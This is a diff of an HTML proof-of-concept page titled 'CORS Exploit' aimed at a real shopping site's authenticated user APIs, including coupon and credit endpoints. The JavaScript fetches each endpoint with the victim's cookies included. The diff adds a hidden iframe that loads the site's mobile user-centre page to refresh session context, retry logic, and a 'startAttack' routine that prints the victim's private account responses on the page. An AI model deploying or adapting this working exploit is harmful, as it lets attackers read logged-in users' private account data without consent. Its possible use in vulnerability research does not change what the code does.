@@ -5,70 +5,58 @@
 <title>CORS Exploit</title>
 
 <style>
-
 body {
-    font-family: Arial;
-    background: #0f172a;
-    color: white;
-    padding: 20px;
+font-family: Arial;
+background: #0f172a;
+color: white;
+padding: 20px;
 }
 
 button {
-    padding: 10px 20px;
-    font-size: 16px;
-    background: #22c55e;
-    border: none;
-    cursor: pointer;
-    color: black;
-    margin-bottom: 20px;
+padding: 10px 20px;
+font-size: 16px;
+background: #22c55e;
+border: none;
+cursor: pointer;
+color: black;
+margin-bottom: 20px;
 }
 
 .container {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-    gap: 15px;
+display: grid;
+grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+gap: 15px;
 }
 
 .card {
-    padding: 15px;
-    border-radius: 10px;
-    background: #1e293b;
-    box-shadow: 0 0 10px rgba(0,0,0,0.5);
+padding: 15px;
+border-radius: 10px;
+background: #1e293b;
 }
 
-.success {
-    border-left: 5px solid #22c55e;
-}
+.success { border-left: 5px solid #22c55e; }
+.fail { border-left: 5px solid #ef4444; }
 
-.fail {
-    border-left: 5px solid #ef4444;
-}
-
-.loading {
-    opacity: 0.6;
-}
+.loading { opacity: 0.6; }
 
 pre {
-    white-space: pre-wrap;
-    word-break: break-word;
-    font-size: 12px;
+white-space: pre-wrap;
+word-break: break-word;
+font-size: 12px;
 }
-
 </style>
+
 </head>
-
-
 <body>
 
-<h2>CORS Exploit (Live Authenticated Requests)</h2>
+<h2>CORS Exploit (Auto Mobile Context Refresh)</h2>
 
-<button onclick="runExploit()">Run Exploit</button>
+<button onclick="startAttack()">Run Exploit</button>
 
-<div class="container" id="results"></div>
+<div id="results" class="container"></div>
 
 
 <script>
-
 
 const endpoints = [
 
@@ -78,11 +66,69 @@ const endpoints = [
 
 "https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
 
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
-
-"https://www.opposhop.cn/cn/oapi/credits/web/credits/show"
+"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
 
 ];
+
+
+
+function sleep(ms) {
+
+return new Promise(resolve => setTimeout(resolve, ms));
+
+}
+
+
+
+async function refreshMobileContext() {
+
+return new Promise(resolve => {
+
+const iframe = document.createElement("iframe");
+
+iframe.style.display = "none";
+
+iframe.src = "https://www.opposhop.cn/cn/m/ucenter/index";
+
+document.body.appendChild(iframe);
+
+setTimeout(resolve, 3000);
+
+});
+
+}
+
+
+
+async function fetchWithRetry(url, retries = 3) {
+
+for (let i = 0; i < retries; i++) {
+
+try {
+
+const res = await fetch(url + "&t=" + Date.now(), {
+
+credentials: "include",
+
+cache: "no-store"
+
+});
+
+if (res.status === 200) {
+
+return res;
+
+}
+
+} catch(e) {}
+
+await sleep(1200);
+
+}
+
+throw "Failed";
+
+}
 
 
 
@@ -106,48 +152,6 @@ return div;
 
 
 
-function sleep(ms) {
-
-return new Promise(resolve => setTimeout(resolve, ms));
-
-}
-
-
-
-async function fetchWithRetry(url, retries = 3) {
-
-for (let i = 0; i < retries; i++) {
-
-try {
-
-const res = await fetch(url + "&t=" + Date.now(), {
-
-credentials: "include",
-
-cache: "no-store"
-
-});
-
-
-if (res.status === 200) {
-
-return res;
-
-}
-
-
-} catch (err) {}
-
-await sleep(1200);
-
-}
-
-throw "Failed after retries";
-
-}
-
-
-
 async function fetchData(url) {
 
 const card = createCard(url);
@@ -156,42 +160,31 @@ const statusEl = card.querySelector(".status");
 
 const pre = card.querySelector("pre");
 
-
-
 try {
-
-let finalUrl = url;
-
 
 if (!url.includes("?")) {
 
-finalUrl += "?t=" + Date.now();
+url += "?";
 
 }
 
-
-const res = await fetchWithRetry(finalUrl);
-
+const res = await fetchWithRetry(url);
 
 const text = await res.text();
-
 
 card.classList.remove("loading");
 
 card.classList.add("success");
 
-
 statusEl.innerText = res.status;
 
 pre.innerText = text;
 
-
-} catch (e) {
+} catch(e) {
 
 card.classList.remove("loading");
 
 card.classList.add("fail");
-
 
 statusEl.innerText = "Error";
 
@@ -203,15 +196,15 @@ pre.innerText = e;
 
 
 
-async function runExploit() {
+async function startAttack() {
 
 document.getElementById("results").innerHTML = "";
 
+await refreshMobileContext();
 
 for (const endpoint of endpoints) {
 
 await fetchData(endpoint);
-
 
 await sleep(700);
 
@@ -219,9 +212,7 @@ await sleep(700);
 
 }
 
-
 </script>
-
 
 </body>
 </html>
